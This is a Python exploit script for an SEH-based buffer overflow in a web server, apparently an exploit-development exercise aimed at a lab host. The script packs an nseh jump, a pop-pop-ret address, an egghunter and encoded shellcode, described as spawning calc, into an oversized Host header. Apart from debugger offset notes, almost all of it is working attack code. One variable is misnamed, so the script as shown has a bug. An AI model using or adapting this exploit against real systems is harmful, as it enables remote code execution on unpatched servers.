#!/usr/bin/python

import socket
from struct import *

victim_host = "10.0.0.17"
victim_port = 80

nseh = "\xEB\xCE\x90\x90" # lets jump back so we have room for the egghunter
seh = pack('<L', 0x004097dd)

# SEH handler overwritten with - 43336143
#[*] Exact match at offset 1569
# Log data, item 23
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0018ff78 overwritten with normal pattern : 0x43336143 (offset 1569), followed by 125 bytes of cyclic data after the handler
"""
testing addresses with null00 byte
0040578A
0040578A
00405B72
00405B85
0040B225
"""

shellcode_calc =  "evilevil"
shellcode_calc += "\x89\xe7\xdb\xd5\xd9\x77\xf4\x5a\x4a\x4a"
shellcode_calc += "\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43"
shellcode_calc += "\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41"
shellcode_calc += "\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
shellcode_calc += "\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41"
shellcode_calc += "\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x59"
shellcode_calc += "\x6c\x49\x78\x4d\x52\x67\x70\x75\x50\x77"
shellcode_calc += "\x70\x43\x50\x6f\x79\x79\x75\x70\x31\x4b"
shellcode_calc += "\x70\x55\x34\x6e\x6b\x46\x30\x66\x50\x4c"
shellcode_calc += "\x4b\x61\x42\x66\x6c\x4c\x4b\x33\x62\x74"
shellcode_calc += "\x54\x4c\x4b\x44\x32\x46\x48\x54\x4f\x6c"
shellcode_calc += "\x77\x50\x4a\x66\x46\x34\x71\x69\x6f\x6c"
shellcode_calc += "\x6c\x65\x6c\x30\x61\x51\x6c\x45\x52\x44"
shellcode_calc += "\x6c\x65\x70\x79\x51\x7a\x6f\x64\x4d\x35"
shellcode_calc += "\x51\x68\x47\x6d\x32\x7a\x52\x51\x42\x51"
shellcode_calc += "\x47\x4c\x4b\x36\x32\x32\x30\x6c\x4b\x70"
shellcode_calc += "\x4a\x67\x4c\x4c\x4b\x70\x4c\x67\x61\x44"
shellcode_calc += "\x38\x4b\x53\x67\x38\x37\x71\x5a\x71\x30"
shellcode_calc += "\x51\x4e\x6b\x71\x49\x47\x50\x47\x71\x6b"
shellcode_calc += "\x63\x6c\x4b\x70\x49\x62\x38\x7a\x43\x76"
shellcode_calc += "\x5a\x37\x39\x6c\x4b\x55\x64\x6e\x6b\x47"
shellcode_calc += "\x71\x4a\x76\x64\x71\x59\x6f\x6c\x6c\x6a"
shellcode_calc += "\x61\x6a\x6f\x64\x4d\x47\x71\x49\x57\x76"
shellcode_calc += "\x58\x69\x70\x33\x45\x38\x76\x77\x73\x51"
shellcode_calc += "\x6d\x79\x68\x65\x6b\x61\x6d\x46\x44\x62"
shellcode_calc += "\x55\x6b\x54\x32\x78\x4c\x4b\x50\x58\x74"
shellcode_calc += "\x64\x67\x71\x79\x43\x73\x56\x4e\x6b\x66"
shellcode_calc += "\x6c\x30\x4b\x4e\x6b\x50\x58\x35\x4c\x77"
shellcode_calc += "\x71\x6b\x63\x6e\x6b\x36\x64\x4e\x6b\x73"
shellcode_calc += "\x31\x6e\x30\x6e\x69\x71\x54\x31\x34\x76"
shellcode_calc += "\x44\x53\x6b\x73\x6b\x51\x71\x31\x49\x43"
shellcode_calc += "\x6a\x53\x61\x49\x6f\x39\x70\x63\x6f\x71"
shellcode_calc += "\x4f\x63\x6a\x4e\x6b\x57\x62\x78\x6b\x4c"
shellcode_calc += "\x4d\x63\x6d\x51\x7a\x57\x71\x6e\x6d\x4f"
shellcode_calc += "\x75\x6e\x52\x55\x50\x67\x70\x55\x50\x56"
shellcode_calc += "\x30\x70\x68\x34\x71\x4e\x6b\x42\x4f\x4f"
shellcode_calc += "\x77\x69\x6f\x59\x45\x4f\x4b\x38\x70\x4c"
shellcode_calc += "\x75\x59\x32\x63\x66\x51\x78\x79\x36\x4e"
shellcode_calc += "\x75\x4d\x6d\x6d\x4d\x69\x6f\x6b\x65\x65"
shellcode_calc += "\x6c\x47\x76\x43\x4c\x44\x4a\x6f\x70\x49"
shellcode_calc += "\x6b\x69\x70\x62\x55\x54\x45\x6d\x6b\x37"
shellcode_calc += "\x37\x75\x43\x42\x52\x70\x6f\x70\x6a\x37"
shellcode_calc += "\x70\x32\x73\x39\x6f\x59\x45\x33\x53\x51"
shellcode_calc += "\x71\x30\x6c\x32\x43\x66\x4e\x30\x65\x52"
shellcode_calc += "\x58\x33\x55\x63\x30\x41\x41"

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x65\x76\x69\x6c\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
 
# !mona egg -t evil - 32 bytes

exploit_payload = "A" *(1491 - len(shellcode)) + shellcode  # - 64 + 2 for jump
exploit_payload += "\x90" * 30 + egghunter
exploit_payload += nseh
exploit_payload += seh

http_request  = "HEAD / HTTP/1.1\r\n"
http_request += "Host:" + exploit_payload + " \r\n"
http_request += "User-Agent: firefox \r\n"
http_request += "If-Modified-Since: Wed \r\n\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

try:
	expl.connect((victim_host, victim_port))
	print("[*] Establishing a connection to the vicitm")
	expl.send(http_request)
	print("[*] Sending the payload")
	expl.close()
	print("[*] Watch for a spawned calc")
except:
	print("[!] Exploit failed to send")
